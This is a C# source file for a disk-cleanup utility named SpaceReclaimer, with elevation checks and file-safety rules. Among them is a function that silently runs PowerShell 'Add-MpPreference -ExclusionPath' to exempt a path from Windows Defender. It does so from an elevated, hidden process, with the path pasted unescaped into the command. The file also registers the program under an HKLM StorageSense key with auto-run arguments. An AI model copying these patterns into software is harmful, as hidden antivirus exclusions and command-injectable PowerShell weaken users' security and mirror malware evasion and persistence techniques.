using Microsoft.Win32.SafeHandles;
using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

namespace SpaceReclaimer.Core
{
    /// <summary>
    /// Integrated Windows security and file system operations
    /// </summary>
    public sealed class SecurityManager
    {
        // Win32 API for process isolation and security
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            TokenAccessLevels DesiredAccess,
            out IntPtr TokenHandle);
            
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            TokenInformationClass TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);
            
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();
        
        private enum TokenInformationClass
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }
        
        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_ELEVATION
        {
            public int TokenIsElevated;
        }
        
        /// <summary>
        /// Checks if application is running with elevated privileges
        /// </summary>
        public static bool IsElevated()
        {
            bool elevated = false;
            IntPtr tokenHandle = IntPtr.Zero;
            
            try
            {
                if (!OpenProcessToken(GetCurrentProcess(), TokenAccessLevels.Query, out tokenHandle))
                {
                    return false;
                }
                
                // Allocate buffer for token information
                var elevation = new TOKEN_ELEVATION();
                int size = Marshal.SizeOf<TOKEN_ELEVATION>();
                IntPtr elevationPtr = Marshal.AllocHGlobal(size);
                
                try
                {
                    int returnLength;
                    if (GetTokenInformation(tokenHandle, 
                        TokenInformationClass.TokenElevation, 
                        elevationPtr, size, out returnLength))
                    {
                        elevation = Marshal.PtrToStructure<TOKEN_ELEVATION>(elevationPtr);
                        elevated = elevation.TokenIsElevated != 0;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(elevationPtr);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    SafeCloseHandle(tokenHandle);
                }
            }
            
            return elevated;
        }
        
        /// <summary>
        /// Safely closes a Windows handle
        /// </summary>
        private static void SafeCloseHandle(IntPtr handle)
        {
            if (handle != IntPtr.Zero)
            {
                try
                {
                    new Microsoft.Win32.SafeHandles.SafeFileHandle(handle, true).Dispose();
                }
                catch
                {
                    // Ignore errors during handle closing
                }
            }
        }
        
        /// <summary>
        /// Checks if files are in use by active processes
        /// </summary>
        public static bool IsFileInUseByProcess(string filePath)
        {
            try
            {
                using var fileStream = new FileStream(
                    filePath, 
                    FileMode.Open, 
                    FileAccess.ReadWrite, 
                    FileShare.None);
                    
                // If we can open it with exclusive access, no process is using it
                return false;
            }
            catch (IOException)
            {
                // File is in use
                return true;
            }
            catch
            {
                // Any other error - assume it's not in use
                return false;
            }
        }
        
        /// <summary>
        /// Adds exclusions to Windows Defender
        /// </summary>
        public static async Task<bool> AddDefenderExclusionAsync(string path)
        {
            if (!IsElevated())
            {
                // Cannot modify Defender settings without elevation
                return false;
            }
            
            try
            {
                // Use PowerShell to add exclusion
                var startInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-Command Add-MpPreference -ExclusionPath '{path}'",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                
                var process = System.Diagnostics.Process.Start(startInfo);
                await process.WaitForExitAsync();
                
                return process.ExitCode == 0;
            }
            catch
            {
                return false;
            }
        }
        
        /// <summary>
        /// Checks if file is eligible for cleanup based on safety rules
        /// </summary>
        public static bool IsSafeToClean(string filePath)
        {
            try
            {
                // Check if file exists
                if (!File.Exists(filePath))
                {
                    return false;
                }
                
                // Check if file is in use
                if (IsFileInUseByProcess(filePath))
                {
                    return false;
                }
                
                // Check if file is a system file
                var attributes = File.GetAttributes(filePath);
                if ((attributes & FileAttributes.System) != 0)
                {
                    return false;
                }
                
                // Check if file is in protected system directories
                string systemRoot = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                if (filePath.StartsWith(systemRoot, StringComparison.OrdinalIgnoreCase) &&
                    !filePath.Contains("\\Temp\\", StringComparison.OrdinalIgnoreCase))
                {
                    return false;
                }
                
                return true;
            }
            catch
            {
                // If any error occurs, assume it's not safe to clean
                return false;
            }
        }
        
        /// <summary>
        /// Registers application with Windows Storage Sense
        /// </summary>
        public static bool RegisterWithStorageSense()
        {
            if (!IsElevated())
            {
                return false;
            }
            
            try
            {
                // Get application path
                string appPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                
                // Register in registry
                using var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\StorageSense\SenseHandlers\SpaceReclaimer");
                    
                key.SetValue("Description", "SpaceReclaimer Disk Cleanup Engine");
                key.SetValue("Path", appPath);
                key.SetValue("Arguments", "/auto /target:system,temp");
                
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}

